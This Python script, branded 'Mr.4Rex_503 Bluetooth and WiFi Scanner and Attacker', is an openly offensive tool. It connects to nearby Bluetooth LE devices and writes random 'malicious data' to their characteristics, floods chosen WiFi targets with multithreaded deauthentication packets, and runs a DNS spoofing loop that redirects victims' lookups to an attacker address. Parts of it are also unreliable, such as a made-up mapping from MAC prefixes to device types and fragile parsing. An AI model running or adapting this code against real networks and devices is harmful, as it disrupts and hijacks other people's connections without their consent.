import bluepy
import time
import argparse
import os
import subprocess
import re
import sys
from scapy.all import *
import threading
import socket
import random
from math import ceil

# Scan for nearby Bluetooth devices with optimized timing
def scan_devices(duration):
    scanner = bluepy.btle.Scanner()
    # Use mathematical logic to determine optimal scan interval
    interval = ceil(duration / 5)
    devices = scanner.scan(interval)
    return devices

# Attack a specific Bluetooth device with optimized data handling
def attack_device(device_mac, attack_duration):
    try:
        device = bluepy.btle.Peripheral(device_mac, bluepy.btle.ADDR_TYPE_RANDOM)
        print(f"Connected to device: {device_mac}")

        # Perform device attack actions with optimized characteristic handling
        services = device.getServices()
        for service in services:
            print(f"Service UUID: {service.uuid}")
            characteristics = service.getCharacteristics()
            for char in characteristics:
                if char.supportsRead():
                    print(f"Reading characteristic {char.uuid}: {char.read()}")
                if char.supportsWrite():
                    print(f"Writing to characteristic {char.uuid}")
                    # Use mathematical logic to generate malicious data
                    malicious_data = bytes([random.randint(0, 255) for _ in range(20)])
                    char.write(malicious_data)
                if char.supportsNotify():
                    print(f"Enabling notifications on characteristic {char.uuid}")
                    device.writeCharacteristic(char.getHandle() + 1, b'\x01\x00', True)

        # Implement attack duration with optimized sleep pattern
        sleep_intervals = [random.uniform(0.1, 1.0) for _ in range(attack_duration)]
        for interval in sleep_intervals:
            time.sleep(interval)

        # Disconnect from the device
        device.disconnect()
        print(f"Disconnected from device: {device_mac}")

    except bluepy.btle.BTLEException as e:
        print(f"Error connecting to device: {device_mac}")
        print(f"Error message: {str(e)}")

# Scan for nearby WiFi devices with optimized process handling
def scan_wifi_devices():
    try:
        output = subprocess.check_output("iwlist wlp2s0 scanning | grep -E 'Address|ESSID|Quality'", shell=True)
        devices = output.decode('utf-8').strip().split('\n')
        # Use mathematical logic to filter and sort devices by signal strength
        devices = sorted(devices, key=lambda x: int(re.search(r'Quality=(\d+/\d+)', x).group(1).split('/')[0]), reverse=True)
        return devices
    except subprocess.CalledProcessError as e:
        print(f"Error scanning WiFi devices: {str(e)}")
        return []

# Display WiFi devices and their details
def display_wifi_devices(devices):
    print("Available WiFi devices:")
    for i, device in enumerate(devices):
        print(f"{i+1}. {device}")

# Choose a WiFi device to attack
def choose_wifi_device(devices):
    while True:
        try:
            choice = int(input("Enter the number of the WiFi device to attack (or 0 to exit): "))
            if choice == 0:
                return None
            elif 1 <= choice <= len(devices):
                return devices[choice - 1]
            else:
                print("Invalid choice. Please try again.")
        except ValueError:
            print("Invalid input. Please enter a number.")

# Get device type based on MAC address
def get_device_type(mac_address):
    mac_pattern = r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$'
    if not re.match(mac_pattern, mac_address):
        return "Invalid MAC address"

    if mac_address.startswith('00:1A:7D') or mac_address.startswith('00:0C:42'):
        return "Android"
    if mac_address.startswith('00:1C:42') or mac_address.startswith('00:50:56'):
        return "PC"
    if mac_address.startswith('00:00:5E') or mac_address.startswith('00:00:00'):
        return "Audio"

    return "Other"

# Attack WiFi device with optimized deauth packets
def attack_wifi_device(device, duration):
    print(f"Attacking WiFi device: {device}")
    target_mac = device.split(' ')[1]
    gateway_mac = "FF:FF:FF:FF:FF:FF"
    dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
    packet = RadioTap()/dot11/Dot11Deauth(reason=7)

    # Use mathematical logic to optimize deauth attack intensity
    def deauth_attack():
        sendp(packet, inter=random.uniform(0.05, 0.2), count=200, iface="wlp2s0", verbose=1)

    threads = []
    for _ in range(ceil(duration / 2)):  # Optimized number of threads
        thread = threading.Thread(target=deauth_attack)
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

    time.sleep(duration)

# Perform a DNS spoofing attack with optimized packet handling
def dns_spoof():
    print("Starting DNS spoofing attack...")
    def spoof_dns(packet):
        if packet.haslayer(DNS) and packet.getlayer(DNS).qr == 0:
            ip = packet.getlayer(IP)
            udp = packet.getlayer(UDP)
            dns = packet.getlayer(DNS)
            spoofed_ip = "192.168.1.100"  # Redirect to attacker's IP
            spoofed_packet = IP(dst=ip.src, src=ip.dst) / \
                             UDP(dport=udp.sport, sport=udp.dport) / \
                             DNS(id=dns.id, qd=dns.qd, aa=1, qr=1, \
                             an=DNSRR(rrname=dns.qd.qname, ttl=10, rdata=spoofed_ip))
            send(spoofed_packet, verbose=0)
            print(f"Spoofed DNS response sent to {ip.src}")

    sniff(filter="udp port 53", prn=spoof_dns)

# Main script execution
def main():
    parser = argparse.ArgumentParser(description="Mr.4Rex_503 Bluetooth and WiFi Scanner and Attacker")
    parser.add_argument("--scan-duration", type=float, default=5.0, help="Scan duration in seconds")
    parser.add_argument("--attack-duration", type=int, default=10, help="Attack duration in seconds")
    args = parser.parse_args()

    print("Mr.4Rex_503 Bluetooth and WiFi Scanner and Attacker")
    print("---------------------------------------------------------")

    # Bluetooth scan and attack
    devices = scan_devices(args.scan_duration)
    print(f"\nFound {len(devices)} Bluetooth devices:")
    for i, device in enumerate(devices):
        print(f"{i+1}. {device.addr} ({get_device_type(device.addr)})")

    while True:
        try:
            choice = int(input("\nEnter the number of the Bluetooth device to attack (or 0 to exit): "))
            if choice == 0:
                break
            elif 1 <= choice <= len(devices):
                attack_device(devices[choice - 1].addr, args.attack_duration)
            else:
                print("Invalid choice. Please try again.")
        except ValueError:
            print("Invalid input. Please enter a number.")

    # WiFi scan and attack
    wifi_devices = scan_wifi_devices()
    display_wifi_devices(wifi_devices)

    while True:
        wifi_device = choose_wifi_device(wifi_devices)
        if not wifi_device:
            break
        attack_wifi_device(wifi_device, args.attack_duration)

    # DNS spoofing attack
    dns_spoof()

    print("Ultimate God-Like Attack Complete!")

if __name__ == "__main__":
    main()
